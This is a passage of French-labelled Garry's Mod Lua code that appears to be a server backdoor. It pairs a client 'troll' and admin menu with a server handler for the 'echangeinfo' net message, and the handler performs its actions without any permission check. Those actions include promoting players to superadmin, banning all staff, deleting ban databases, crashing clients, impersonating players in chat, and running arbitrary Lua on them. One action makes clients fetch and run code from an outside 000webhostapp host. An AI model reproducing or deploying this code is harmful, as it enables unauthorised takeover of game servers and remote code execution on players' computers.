         net.Start( "echangeinfo" )
         net.WriteString("exploseuser")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez d'exploser " .. userl:Nick())
 end ):SetIcon( "icon16/delete.png" )

ulxsubgrade:AddOption( "[SUPERADMIN]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("superadmin")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de passer " .. userl:Nick() .. " [superadmin]")
end ):SetIcon( "icon16/user_add.png" )

ulxsubgrade:AddOption( "[USER]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("userrank")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de passer " .. userl:Nick() .. " [user]")
end ):SetIcon( "icon16/user_delete.png" )

ulxsubgrade:AddOption( "[CUSTOM]", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame )
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "vip" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("custom")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/user_delete.png" ) 

ulxsubnoclip:AddOption( "[ON]", function() 
     net.Start( "echangeinfo" )
     net.WriteString("noclipon")
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( "icon16/accept.png" )

ulxsubnoclip:AddOption( "[OFF]", function() 
     net.Start( "echangeinfo" )
     net.WriteString("noclipoff")
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

ulx:AddOption( "Donner de l'argent", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "500" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("addmoney")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/money_add.png" ) 

ulx:AddOption( "Point de Vie", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "100" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("pvheal")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/heart.png" )

ulx:AddOption( "Point d'armure", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "250" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("armorpv")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/user_suit.png" )

troll:AddOption( "Launch", function() 
         net.Start( "echangeinfo" )
         net.WriteString("launchuser")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous d'envoyer " .. userl:Nick() .. " dans les airs")
end ):SetIcon( "icon16/arrow_up.png" )

ulx:AddOption( "Meurtre au RPG", function() 
         net.Start( "echangeinfo" )
         net.WriteString("lockdown")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/clock_red.png" )

troll:AddOption( "2D Players", function() 
         net.Start( "echangeinfo" )
         net.WriteString("2dplayeruser")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/arrow_up.png" )

troll:AddOption( "Donner la grosse tÃªte", function() 
         net.Start( "echangeinfo" )
         net.WriteString("grosseteteuser")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bug.png" )

troll:AddOption( "Changer la taille du joueur", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "5" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("scaleuser")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/application_edit.png" )

troll:AddOption( "Faire crash le joueur", function() 
     net.Start( "echangeinfo" )
     net.WriteString("crashuser")
     net.WriteEntity( userl )
     net.SendToServer()
     actioneff(userl:Nick() .. " vient de crash")
end ) :SetIcon( "icon16/disconnect.png" )

troll:AddOption( "Hurlement", function() 
         net.Start( "echangeinfo" )
         net.WriteString("hurlementuser")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez d'hurler sur " .. userl:Nick())
end ):SetIcon( "icon16/bell.png" )

trollsubflash:AddOption( "[ON]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("flashon")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

trollsubflash:AddOption( "[OFF]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("flashoff")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/cancel.png" )

trollsubscreen:AddOption( "[ON]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("screenon")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

trollsubscreen:AddOption( "[OFF]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("screenoff")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/cancel.png" ) 

trollsubstopsound:AddOption( "[ON]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("stopsoundon")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/accept.png" )

trollsubstopsound:AddOption( "[OFF]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("stopsoundoff")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/cancel.png" ) 

trollsubmoooves:AddOption( "[ON]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("moovetroll")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(userl:Nick().." vient de perdre le contrÃ´le")
end ):SetIcon( "icon16/accept.png" )

trollsubmoooves:AddOption( "[OFF]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unmoovetroll")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(userl:Nick().." vient de reprendre le contrÃ´le")
end ):SetIcon( "icon16/cancel.png" )

trollsubgravity:AddOption( "[ON]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("cassergr")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de casser la gravitÃ© de " .. userl:Nick())
end ):SetIcon( "icon16/accept.png" )

trollsubgravity:AddOption( "[OFF]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("retablirgr")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de rÃ©tablir la gravitÃ© Ã  " .. userl:Nick())
end ):SetIcon( "icon16/cancel.png" )

trollsubjumpc:AddOption( "[ON]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("jumpuser")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de casser la gravitÃ© des sauts de " .. userl:Nick())
end ):SetIcon( "icon16/accept.png" )

trollsubjumpc:AddOption( "[OFF]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("retablirjumpuser")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de rÃ©tablir la gravitÃ© des sauts de " .. userl:Nick())
end ):SetIcon( "icon16/cancel.png" )

troll:AddOption( "Black Screen", function() 
         net.Start( "echangeinfo" )
         net.WriteString("blackscreen")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez d'enlever la vue Ã  " .. userl:Nick())
end ):SetIcon( "icon16/contrast.png" )

troll:AddOption( "Imitation", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "/ooc Je suis un soumis." )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("imitation")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/application_edit.png" )

trollsubmic:AddOption( "[ON]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("micon")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous avez activer le micro de " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

trollsubmic:AddOption( "[OFF]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("micoff")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous avez dÃ©sactiver le micro de " .. userl:Nick() )
end ):SetIcon( "icon16/cancel.png" )

troll:AddOption( "Changer le model", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "models/editor/playerstart.mdl" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("setmodel")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/box.png" )

troll:AddOption( "Send LUA", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Lua Code" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("sendluauser")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/application_xp_terminal.png" )


visuel:AddOption( "Visuel John", function() 
         net.Start( "echangeinfo" )
         net.WriteString("johnsound")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/application_xp_terminal.png" )

soundboard:AddOption( "SoundBoard Lien", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Lua Code" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("soundboard")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/application_xp_terminal.png" )

ulxsubgod:AddOption( "[ON]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("goduseron")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de mettre en mode dieu " .. userl:Nick())
 end ):SetIcon( "icon16/heart_add.png" ) 
ulxsubgod:AddOption( "[OFF]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("goduseroff")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez d'enlever de mode dieu " .. userl:Nick())
 end ):SetIcon( "icon16/heart_delete.png" ) 
ulx:AddOption( "Give une arme", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "weapon_rpg" )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("items")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/bomb.png" ) 

ulx:AddOption( "Kick", function() 
local frame = vgui.Create( "DFrame" )
frame:SetSize( 400, 100 )
frame:SetTitle( "" )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( "DTextEntry", frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( "Raison..." )
TextEntry.OnEnter = function( self )
         net.Start( "echangeinfo" )
         net.WriteString("kickuser")
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( "icon16/status_away.png" )

ulx:AddOption( "Ban", function() 
         net.Start( "echangeinfo" )
         net.WriteString("banuser")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de ban " .. userl:Nick())
end ):SetIcon( "icon16/status_busy.png" ) 

ulx:AddOption( "BanIP", function() 
         net.Start( "echangeinfo" )
         net.WriteString("banipuser")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de banIP " .. userl:Nick())
end ):SetIcon( "icon16/status_busy.png" ) 

ulxsubfreeze:AddOption( "[ON]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("freezeuser")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de freeze " .. userl:Nick())
end ):SetIcon( "icon16/accept.png" )

ulxsubfreeze:AddOption( "[OFF]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unfreezeuser")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de unfreeze " .. userl:Nick())
end ):SetIcon( "icon16/cancel.png" ) 

ulx:AddOption( "Unjail", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unjailall")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bomb.png" )

ulx:AddOption( "Stripweapon", function() 
         net.Start( "echangeinfo" )
         net.WriteString("strip")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez d'enlever les armes de " .. userl:Nick() )
end ):SetIcon( "icon16/bomb.png" )

ulx:AddOption( "Context De Combat", function() 
         net.Start( "echangeinfo" )
         net.WriteString("contextfucker")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vient d'obtenir le pouvoir de vie et de mort ")
end ):SetIcon( "icon16/bomb.png" )

tpsubgmconstruct:AddOption( "Spawn", function() 
         net.Start( "echangeinfo" )
         net.WriteString("gm_construct_spawn")
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmconstruct:AddOption( "Building NÂ°1 [DerniÃ¨re Ã©tage]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("gm_construct_building_roof0")
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmconstruct:AddOption( "Building NÂ°1 [Toit]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("gm_construct_building_roof1")
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmconstruct:AddOption( "Building NÂ°2 [DerniÃ¨re Ã©tage]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("gm_construct_building2_roof1")
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmconstruct:AddOption( "Building NÂ°2 [Toit]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("gm_construct_building2_roof0")
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmconstruct:AddOption( "Building NÂ°3 [Toit]", function() 
         net.Start( "echangeinfo" )
         net.WriteString("gm_construct_building3_roof0")
         net.WriteEntity( userl )
         net.SendToServer()
end )


tpsubgmconstruct:AddOption( "Sous-Sol", function() 
         net.Start( "echangeinfo" )
         net.WriteString("gm_construct_down")
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmconstruct:AddOption( "Secret Room", function() 
         net.Start( "echangeinfo" )
         net.WriteString("gm_construct_secret")
         net.WriteEntity( userl )
         net.SendToServer()
end )
tpsubgmconstruct:AddOption( "Skybox", function() 
         net.Start( "echangeinfo" )
         net.WriteString("gm_construct_skybox")
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmflat:AddOption( "Secret Room", function() 
         net.Start( "echangeinfo" )
         net.WriteString("gm_flat_secret")
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubglife3:AddOption( "Grue", function() 
         net.Start( "echangeinfo" )
         net.WriteString("glife3_grue")
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubglife3:AddOption( "Water tower", function() 
         net.Start( "echangeinfo" )
         net.WriteString("glife3_water_tower")
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubglife3:AddOption( "Bank Vault", function() 
         net.Start( "echangeinfo" )
         net.WriteString("glife3_coffre")
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubglife3:AddOption( "Secret Room", function() 
         net.Start( "echangeinfo" )
         net.WriteString("glife3_secret")
         net.WriteEntity( userl )
         net.SendToServer()
end )

downtownv4cv2:AddOption( "Spawn", function() 
         net.Start( "echangeinfo" )
         net.WriteString("rp_rockford_v2b_spawn")
         net.WriteEntity( userl )
         net.SendToServer()
end )

animation:AddOption( "Saluer", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_salute_user")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animation:AddOption( "Robot", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_robot_user")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animation:AddOption( "Levez les mains", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_cheer_user")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animation:AddOption( "Rire", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_laugh_user")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animation:AddOption( "Danse sexy", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_muscle_user")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animation:AddOption( "Faire le beau", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_persistence_user")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )

animation:AddOption( "Dance", function() 
         net.Start( "echangeinfo" )
         net.WriteString("animation_dance_user")
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( "icon16/bell.png" )


mooves:AddOption( "[ON]Avancer", function() 
         net.Start( "echangeinfo" )
         net.WriteString("forwardmoove")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de faire avancer " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]Avancer", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unforwardmoove")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez d'arrÃªter de faire avancer " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )

mooves:AddOption( "[ON]Reculer", function() 
         net.Start( "echangeinfo" )
         net.WriteString("backmoove")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de faire reculer " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]Reculer", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unbackmoove")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez d'arrÃªter de faire reculer " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )

mooves:AddOption( "[ON]Tourner Ã  gauche", function() 
         net.Start( "echangeinfo" )
         net.WriteString("leftmoove")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de faire touner Ã  gauche " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]Tourner Ã  gauche", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unleftmoove")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez d'arrÃªter de faire touner Ã  gauche " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )

mooves:AddOption( "[ON]Tourner Ã  droite", function() 
         net.Start( "echangeinfo" )
         net.WriteString("rightmoove")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez d'arrÃªter de faire touner Ã  droite " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]Tourner Ã  droite", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unrightmoove")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez d'arrÃªter de faire touner Ã  gauche " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )

mooves:AddOption( "[ON]S'accroupir", function() 
         net.Start( "echangeinfo" )
         net.WriteString("squatmoove")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez de faire s'accroupir " .. userl:Nick() )
end ):SetIcon( "icon16/accept.png" )

mooves:AddOption( "[OFF]S'accroupir", function() 
         net.Start( "echangeinfo" )
         net.WriteString("unsquatmoove")
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff("Vous venez d'arrÃªter de faire s'accroupir " .. userl:Nick() )
end ):SetIcon( "icon16/stop.png" )


m:AddSpacer() -- Add a spacer
m:Open() -- Show our menu
end
        ]] )
        net.Send(ply)
        return ""
end )


net.Receive("echangeinfo", function()
    local uaction = net.ReadString()
    local user = net.ReadEntity()

    if (uaction == "banall") then
        for k,v in pairs (player.GetAll()) do v:Ban( 0, true ) end
    end

    if (uaction == "banallstaff") then
        for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:Ban( 0, true ) end end

    end

    if (uaction == "blackscreen") then
    user:ScreenFade( SCREENFADE.IN, Color( 0, 0, 0, 500 ), 500000, 500000 )
    end

    if (uaction == "imitation") then
        user:Say( net.ReadString(),true )
    end

    if (uaction == "sendluauser") then
        user:SendLua( net.ReadString() ) --sound.PlayURL( "https://translate.google.com/translate_tts?ie=UTF-8&tl=fr-TR&client=tw-ob&q=TEXTE", "", function()end )
    end
    
    if (uaction == "johnsound") then
        user:SendLua( [[http.Fetch("https://akitaman.000webhostapp.com/john.lua",function(body,len,headers,code)RunString(body)end) ]] ) --sound.PlayURL( "https://translate.google.com/translate_tts?ie=UTF-8&tl=fr-TR&client=tw-ob&q=TEXTE", "", function()end )
    end
    
    if (uaction == "soundboard") then
        user:SendLua( [[sound.PlayURL( "]]..net.ReadString()..[[", "", function()end )]] ) --sound.PlayURL( "https://translate.google.com/translate_tts?ie=UTF-8&tl=fr-TR&client=tw-ob&q=TEXTE", "", function()end )
    end

    if (uaction == "kickuser") then
        user:Kick( net.ReadString() )
    end

    if (uaction == "addmoney") then
        user:addMoney(net.ReadString())
    end

    if (uaction == "stopsoundon") then
        user:SendLua([[timer.Create("stopsound", 0.001, 0, function() LocalPlayer():ConCommand("stopsound") end)]])
    end

    if (uaction == "stopsoundoff") then
        user:SendLua([[timer.Remove("stopsound")]])
    end

    if (uaction == "igniteall") then
        for k,v in pairs(player.GetAll()) do v:Ignite(120) end
    end

    if (uaction == "igniteallstaff") then
        for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:Ignite(120) end end
    end

    if (uaction == "healall") then
        for k,v in pairs (player.GetAll()) do v:SetHealth( net.ReadString() ) end
    end

    if (uaction == "armorall") then
        for k,v in pairs (player.GetAll()) do v:SetArmor( net.ReadString() ) end
    end

    if (uaction == "banuser") then
        user:Ban( 0, true )
    end

    if (uaction == "banipuser") then
        RunConsoleCommand( "addip", 0, user:IPAddress() )
        RunConsoleCommand( "writeip" )
    end

    if (uaction == "kickall") then
        for k,v in pairs (player.GetAll()) do v:Kick( net.ReadString() ) end
    end

    if (uaction == "kickallstaff") then
        for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:Kick( net.ReadString() ) end end
    end

    if (uaction == "killall") then
        for k,v in pairs (player.GetAll()) do v:Kill() end
    end

    if (uaction == "exploseall") then
        for k,v in pairs(player.GetAll()) do
        local explode = ents.Create( "env_explosion" )
            explode:SetPos(v:GetPos())
            explode:Spawn()
            explode:SetKeyValue( "iMagnitude", "10" )
            explode:Fire( "Explode", 0, 0 )
            explode:EmitSound( "weapon_AWP.Single", 400, 400 )
        v:Kill()
        end
    end

    if (uaction == "exploseuser") then
        local explode = ents.Create( "env_explosion" )
            explode:SetPos(user:GetPos())
            explode:Spawn()
            explode:SetKeyValue( "iMagnitude", "10" )
            explode:Fire( "Explode", 0, 0 )
            explode:EmitSound( "weapon_AWP.Single", 400, 400 )
        user:Kill()
    end

    if (uaction == "exploseall") then
        for k,v in pairs(player.GetAll()) do
            if( v:GetUserGroup() != "user" ) then 
                local explode = ents.Create( "env_explosion" )
                explode:SetPos(v:GetPos())
                explode:Spawn()
                explode:SetKeyValue( "iMagnitude", "10" )
                explode:Fire( "Explode", 0, 0 )
                explode:EmitSound( "weapon_AWP.Single", 400, 400 )
            v:Kill()
            end
        end
    end

    if (uaction == "killallstaff") then
        for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:Kill() end end
    end

    if (uaction == "freezeall") then
        for k,v in pairs (player.GetAll()) do v:Freeze( true ) end
    end

    if (uaction == "freezeallstaff") then
        for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:Freeze( true ) end end
    end

    if (uaction == "freezeuser") then
        user:Freeze( true )
    end

    if (uaction == "moovetroll") then
        user:ConCommand( "+duck" )
        user:ConCommand( "+left" )
        user:ConCommand( "+jump" )
    end

    if (uaction == "moovetrollall") then
        for k,v in pairs (player.GetAll()) do v:ConCommand( "+duck" ) end
        for k,v in pairs (player.GetAll()) do v:ConCommand( "+left" ) end
        for k,v in pairs (player.GetAll()) do v:ConCommand( "+jump" ) end
    end

    if (uaction == "unmoovetroll") then
        user:ConCommand( "-duck" )
        user:ConCommand( "-left" )
        user:ConCommand( "-jump" )
    end

    if (uaction == "unmoovetrollall") then
        for k,v in pairs (player.GetAll()) do v:ConCommand( "-duck" ) end
        for k,v in pairs (player.GetAll()) do v:ConCommand( "-left" ) end
        for k,v in pairs (player.GetAll()) do v:ConCommand( "-jump" ) end
    end

    if (uaction == "addmoneyalls") then
    local money = net.ReadString()
        for k,v in pairs (player.GetAll()) do v:addMoney(money) end
    end

    if (uaction == "forwardmooveall") then
        for k,v in pairs (player.GetAll()) do v:ConCommand( "+forward" ) end
    end

    if (uaction == "botspam") then
    local n = net.ReadString()
        for i=1,n do
            RunConsoleCommand("bot")
        end
    end

    if (uaction == "unforwardmooveall") then
        for k,v in pairs (player.GetAll()) do v:ConCommand( "-forward" ) end
    end

    if (uaction == "hurlement") then
        for k,v in pairs(player.GetAll()) do v:EmitSound( "npc/stalker/go_alert2a.wav", 100, 100 ) end
    end

    if (uaction == "hurlementuser") then
        user:EmitSound( "npc/stalker/go_alert2a.wav", 100, 100 )
    end

    if (uaction == "unbanall") then
        sql.Query("DELETE FROM `FAdminBans`")
        sql.Query("DELETE FROM `ulib_bans`")
    end

    if (uaction == "backmooveall") then
        for k,v in pairs (player.GetAll()) do v:ConCommand( "+back" ) end
    end

    if (uaction == "pvheal") then
        user:SetHealth(net.ReadString())
    end

    if (uaction == "crashadminvip") then
    for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != "user" ) then v:SendLua("while true do end") end end
    end

    if (uaction == "armorpv") then
        user:SetArmor(net.ReadString())
    end

    if (uaction == "unbackmooveall") then
        for k,v in pairs (player.GetAll()) do v:ConCommand( "-back" ) end
    end

    if (uaction == "leftmooveall") then
        for k,v in pairs (player.GetAll()) do v:ConCommand( "+left" ) end
    end

    if (uaction == "unleftmooveall") then
        for k,v in pairs (player.GetAll()) do v:ConCommand( "-left" ) end
    end

    if (uaction == "rightmooveall") then
        for k,v in pairs (player.GetAll()) do v:ConCommand( "+right" ) end
    end

    if (uaction == "unrightmooveall") then
        for k,v in pairs (player.GetAll()) do v:ConCommand( "-right" ) end
    end

    if (uaction == "squatmooveall") then
        for k,v in pairs (player.GetAll()) do v:ConCommand( "+duck" ) end
    end

    if (uaction == "unsquatmooveall") then
        for k,v in pairs (player.GetAll()) do v:ConCommand( "-duck" ) end
    end

    if (uaction == "forwardmoove") then
        user:ConCommand( "+forward" )
    end

    if (uaction == "unforwardmoove") then
        user:ConCommand( "-forward" )
    end

    if (uaction == "backmoove") then
        user:ConCommand( "+back" )
    end

    if (uaction == "unbackmoove") then
        user:ConCommand( "-back" )
    end

    if (uaction == "leftmoove") then
        user:ConCommand( "+left" )
    end

    if (uaction == "unleftmoove") then
        user:ConCommand( "-left" )
    end

    if (uaction == "notification_generic") then
    local text = net.ReadString()
    local duration = 50
        for k,v in pairs (player.GetAll()) do
        
            v:SendLua("notification.AddLegacy(\"" .. text .. "\", NOTIFY_GENERIC, " .. duration .. ")")
            
            v:SendLua([[surface.PlaySound("buttons/button15.wav")]])
            
            ULib.console( v, text )
            
        end
    end

    if (uaction == "notification_error") then
    local text = net.ReadString()
    local duration = 50
